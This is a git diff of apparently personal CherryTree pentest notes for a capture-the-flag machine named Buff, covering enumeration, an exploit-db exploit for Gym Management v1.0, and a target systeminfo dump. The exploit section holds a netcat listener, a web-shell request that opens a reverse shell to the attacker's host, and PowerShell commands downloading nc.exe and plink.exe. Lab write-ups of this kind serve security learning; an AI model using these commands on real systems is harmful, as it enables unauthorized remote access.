@@ -1,6 +1,6 @@
 <?xml version="1.0" ?>
 <cherrytree>
-	<node custom_icon_id="0" foreground="" is_bold="False" name="Buff" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601085808.27" ts_lastsave="1601091960.0" unique_id="1">
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Buff" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601085808.27" ts_lastsave="1601093164.17" unique_id="1">
 		<rich_text></rich_text>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="Enum" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601085817.88" ts_lastsave="1601085839.41" unique_id="2">
 			<rich_text></rich_text>
@@ -35,25 +35,79 @@ Nmap done: 1 IP address (1 host up) scanned in 1437.11 seconds
 </rich_text>
 			</node>
 		</node>
-	</node>
-	<node custom_icon_id="0" foreground="" is_bold="False" name="Exploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601091960.01" ts_lastsave="1601091978.22" unique_id="4">
-		<rich_text></rich_text>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="gym manager v1.0" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601091978.22" ts_lastsave="1601092125.55" unique_id="5">
-			<rich_text>On the page </rich_text>
-			<rich_text link="webs http://10.10.10.198:8080/contact.php">http://10.10.10.198:8080/contact.php</rich_text>
-			<rich_text> see CMS and version
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Exploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601091960.01" ts_lastsave="1601093124.84" unique_id="4">
+			<rich_text></rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="gym manager v1.0" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601091978.22" ts_lastsave="1602308453.09" unique_id="5">
+				<rich_text>On the page </rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/contact.php">http://10.10.10.198:8080/contact.php</rich_text>
+				<rich_text> see CMS and version
 
 Google exploit for CMS. Find exploit </rich_text>
-			<rich_text link="webs https://www.exploit-db.com/exploits/48506">https://www.exploit-db.com/exploits/48506</rich_text>
-			<rich_text>
+				<rich_text link="webs https://www.exploit-db.com/exploits/48506">https://www.exploit-db.com/exploits/48506</rich_text>
+				<rich_text>
 
 Go it in the terminal
 python 48506.py </rich_text>
-			<rich_text link="webs http://10.10.10.198:8080/">http://10.10.10.198:8080/</rich_text>
-			<rich_text>
+				<rich_text link="webs http://10.10.10.198:8080/">http://10.10.10.198:8080/</rich_text>
+				<rich_text>
 
 
-</rich_text>
+launch serve: nc -lvvnp 1337
+initiate connect to server: 10.10.10.198:8080/upload/kamehameha.php?telepathy=nc.exe 10.10.16.5 1337 -e cmd.exe
+
+powershell -c curl </rich_text>
+				<rich_text link="webs http://10.10.*.*/nc.exe">http://10.10.16.2:8080/nc.exe</rich_text>
+				<rich_text> -O nc.exe
+powershell -c curl </rich_text>
+				<rich_text link="webs http://10.10.*.*/nc.exe">http://10.10.16.2:8080/plink.exe</rich_text>
+				<rich_text> -O plink.exe</rich_text>
+			</node>
 		</node>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Systeminfo" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601093164.17" ts_lastsave="1601093166.19" unique_id="6">
+		<rich_text>Host Name:                 BUFF
+OS Name:                   Microsoft Windows 10 Enterprise
+OS Version:                10.0.17134 N/A Build 17134
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          shaun
+Registered Organization:   
+Product ID:                00329-10280-00000-AA218
+Original Install Date:     16/06/2020, 15:05:58
+System Boot Time:          26/09/2020, 02:32:53
+System Manufacturer:       VMware, Inc.
+System Model:              VMware7,1
+System Type:               x64-based PC
+Processor(s):              2 Processor(s) Installed.
+                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 19/06/2019
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume2
+System Locale:             en-us;English (United States)
+Input Locale:              en-gb;English (United Kingdom)
+Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
+Total Physical Memory:     4,095 MB
+Available Physical Memory: 2,465 MB
+Virtual Memory: Max Size:  4,799 MB
+Virtual Memory: Available: 2,755 MB
+Virtual Memory: In Use:    2,044 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: vmxnet3 Ethernet Adapter
+                                 Connection Name: Ethernet0
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.198
+                                 [02]: fe80::59a7:777a:b2d:92d3
+                                 [03]: dead:beef::495c:e0a0:6a96:defd
+                                 [04]: dead:beef::59a7:777a:b2d:92d3
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+</rich_text>
 	</node>
 </cherrytree>
